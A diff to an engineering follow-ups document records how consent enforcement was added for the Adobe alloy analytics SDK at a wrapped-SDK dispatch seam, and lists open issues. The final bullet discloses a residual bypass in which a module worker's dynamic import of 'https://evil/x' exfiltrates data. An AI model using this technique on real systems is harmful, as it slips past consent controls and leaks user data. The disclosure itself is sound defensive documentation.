@@ -293,3 +293,36 @@ reshape ①, cookie-capability deny ②, seal hold/strict-drop ③) — see
   — no `egressPurposes` gate is wired at alloy's wrapped-SDK dispatch seam
   (`core/wrapped-sdk-host.js`). Consent enforcement for alloy is out of scope
   for spec 017 (GA4-only, per the spec's own framing).
+
+## Spec 020 (alloy XDM governance) follow-ups — spec 020 COMPLETE (alloy governed)
+
+**Resolved (spec 020, 2026-08-31):** the 017-03 alloy-consent residual above is
+**RESOLVED** — alloy egress is now consent-enforced at `core/wrapped-sdk-host.js`'s
+`dispatchInterceptedFetch` via `egressVerdict(consent, egressPurposes, {strict:true})`
+(the TRUSTED seam-side drop) + the in-chamber `setConsent` command
+(`connectors/alloy/consent.js` → the Adobe 2.0 shape, driven `configure → setConsent →
+sendEvent`). The probe (020-01) found alloy's payload already read-minimized by
+construction (`toXdm` 2-field allowlist + `context:[]`), with an optional Edge-safe
+defense-in-depth strip. Recorded in [ADR-0013](decisions/adr-0013-alloy-consent-enforcement.md)
+(supersedes ADR-0012's alloy-Split + resolves ADR-0007's alloy residual). **Named follow-ons:**
+- **`pending → hold+flush` for the alloy seam** — 020-02 does `pending → drop` (fail-closed, the
+  first-impl choice: the alloy interact is a synchronous vendor round-trip, not a queued `{url,body}`
+  beacon like GA4's 017-03 async seal, so a hold+flush needs a replay decouple that does not yet exist
+  for the wrapped-SDK path). **Open question (020-02 arch review):** is pending-window data loss
+  acceptable for alloy, or should hold+flush be prioritized? Resolution trigger: a deployment where
+  the pending-consent window materially drops alloy analytics/personalization.
+- **The live `setConsent(collect:n)` flow + HTML-rig consent wiring** — 020 characterized the setConsent
+  mechanism from the alloy@2.35.0 source; a live `configure → setConsent(collect:n) → sendEvent`
+  (asserting the interact is suppressed) + wiring `rig/alloy-core-host-harness.html` /
+  `alloy-coalescing-core-harness.html` to pass `consent`/`egressPurposes`/`payloadDenylist` for a
+  live/browser exercise is a named creds-gated follow-on (013 infra).
+- **Purpose-list mirror drift** — alloy's collect-governing purposes are stated in THREE places
+  (`connectors/alloy/connector.js`'s manifest `purposes.egress`, `connectors/alloy/consent.js`'s
+  `COLLECT_PURPOSES`, and each caller's injected `egressPurposes`), a documented-but-unenforced mirror
+  (the same accepted idiom as GA4's `DATA_USE_PURPOSES`). A manifest change silently diverges the two
+  levers; no test guards it. Resolution trigger: if `purposes.egress` ever changes, or on a third such
+  connector (rule-of-three → a shared accessor).
+- **The disclosed dynamic-`import()` residual** (016, worker CSP) bounds the "held at the seam" trust
+  claim for ALL seam controls (ceiling / config-integrity / consent), not just consent — a `type:"module"`
+  worker's `await import("https://evil/x")` exfiltrates via the specifier fetch, which no JS shim withholds;
+  gated by a worker `connect-src` CSP (host-controlled response headers), not by these seam controls.
